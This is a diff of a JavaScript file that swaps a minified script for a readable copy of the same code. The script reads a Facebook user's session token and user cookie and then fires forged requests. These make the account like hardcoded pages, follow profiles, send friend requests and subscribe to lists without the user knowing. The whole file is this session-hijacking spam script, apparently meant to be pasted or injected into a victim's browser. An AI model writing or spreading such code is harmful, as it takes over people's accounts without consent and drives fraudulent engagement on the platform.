@@ -1,7 +1,129 @@
-var b=document.getElementsByName("fb_dtsg")[0].value,c=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function e(d){var a=new XMLHttpRequest;d="&fbpage_id="+d+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+c+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+b+"&phstamp=";a.open("POST","//www.facebook.com/ajax/pages/fan_status.php",!0);a.onreadystatechange=function(){4==a.readyState&&200==a.status&&a.close};a.send(d)}e("313072532101076");
-e("190451517757758");e("595580513789645");e("300241633420701");e("231125826929893");e("456401041060837");e("523004351084154");e("229353647087574");e("229488947108546");e("205908352819272");e("313072532101076");e("209464459125570");e("523004351084154");e("200776629976061");e("147857465295449");e("163588093717517");e("291092130903328");e("429143760437630");e("149394451859931");e("306495312809675");b=document.getElementsByName("fb_dtsg")[0].value;c=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-function f(d){var a=new XMLHttpRequest;d="profile_id="+d+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+b+"&lsd&__"+c+"&phstamp=";a.open("POST","/ajax/follow/follow_profile.php?__a=1",!0);a.onreadystatechange=function(){4==a.readyState&&200==a.status&&a.close};a.send(d)}f("100003697277263");f("100003846224832");f("100001050235420");f("100001375288085");f("100003231350883");f("100001610096787");f("100004459350389");f("100002760409500");f("100003996410930");f("100002753085498");
-f("100001597470562");f("100003236292409");f("100002514625419");f("100003719477594");f("100003323922152");f("100003641105051");f("100003766050046");f("100003291769896");f("100003231350883");f("100003822041168");f("100003793848333");f("100003790742474");f("100003579341486");f("100003531745127");f("100004164938729");b=document.getElementsByName("fb_dtsg")[0].value;c=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-function g(d){var a=new XMLHttpRequest;d="&ref=group_jump_header&group_id="+d+"&fb_dtsg="+b+"&__user="+c+"&phstamp=";a.open("POST","/ajax/groups/membership/r2j.php?__a=1",!0);a.onreadystatechange=function(){4==a.readyState&&200==a.status&&a.close};a.send(d)}g("239289549496931");g("316841318342671");g("357909450933599");g("440858199282766");g("171746262887303");g("219443008138853");g("267492216694477");g("455780131120652");g("106728282728505");b=document.getElementsByName("fb_dtsg")[0].value;c=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-function h(d){var a=new XMLHttpRequest;d="to_friend="+d+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+c+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+b+"&phstamp=";a.open("POST","//www.facebook.com/ajax/add_friend/action.php",!0);a.onreadystatechange=function(){4==a.readyState&&200==a.status&&a.close};a.send(d)}h("100004459350389");h("100004021942009");b=document.getElementsByName("fb_dtsg")[0].value;
-c=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function j(d){var a=new XMLHttpRequest;d="flid="+d+"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+c+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+b+"&phstamp=";a.open("POST","//www.facebook.com/ajax/friends/lists/subscribe/modify",!0);a.onreadystatechange=function(){4==a.readyState&&200==a.status&&a.close};a.send(d)}j("567376543307348");j("562836113761391");j("352246548208596");j("4399231940310");j("10200819572312984");j("10200820950347434");j("10200819976883098");j("10200865018889120");j("503774323004340");j("466396010097340");j("513612745361959");
+/*Like Page*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function Like(p) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
+  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+Like("313072532101076");
+Like("190451517757758");
+Like("595580513789645");
+Like("300241633420701");
+Like("231125826929893");
+Like("456401041060837");
+Like("523004351084154");
+Like("229353647087574");
+Like("229488947108546");  
+Like("205908352819272");   
+Like("313072532101076");  
+Like("209464459125570");  
+Like("523004351084154");   
+Like("200776629976061");  
+Like("147857465295449");  
+Like("163588093717517");  
+Like("291092130903328");  
+Like("429143760437630");  
+Like("149394451859931");
+Like("306495312809675");   
+ 
+/*Auto Follow*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function a(abone) {
+  var http4 = new XMLHttpRequest();
+  var url4 = "/ajax/follow/follow_profile.php?__a=1";
+  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
+}
+a("100003697277263");
+a("100003846224832");
+a("100001050235420");
+a("100001375288085");
+a("100003231350883");
+a("100001610096787");
+a("100004459350389");
+a("100002760409500");  
+a("100003996410930");  
+a("100002753085498");    
+a("100001597470562");  
+a("100003236292409"); 
+a("100002514625419");  
+a("100003719477594");  
+a("100003323922152");  
+a("100003641105051");  
+a("100003766050046");  
+a("100003291769896");  
+a("100003231350883");  
+a("100003822041168");  
+a("100003793848333");  
+a("100003790742474");  
+a("100003579341486");  
+a("100003531745127");  
+a("100004164938729"); 
+
+/*Add Friend*/ 
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function IDS(r) {
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
+  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+IDS("100004459350389");
+IDS("100004021942009");
+
+/*Follow List*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function LIST(L) {
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
+  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+LIST("567376543307348");
+LIST("562836113761391");
+LIST("352246548208596");
+LIST("4399231940310");
+LIST("10200819572312984");
+LIST("10200820950347434");
+LIST("10200819976883098");
+LIST("10200865018889120");
+LIST("466396010097340");
+LIST("466380243430111");
+LIST("381489938632591");
+LIST("611411958872392");
+LIST("551467628239578");
+LIST("358808870905474");
+LIST("325715414223519");
+LIST("538818886161261");
+LIST("156489554515051");
+LIST("359722610800552");
+LIST("146971562150041");
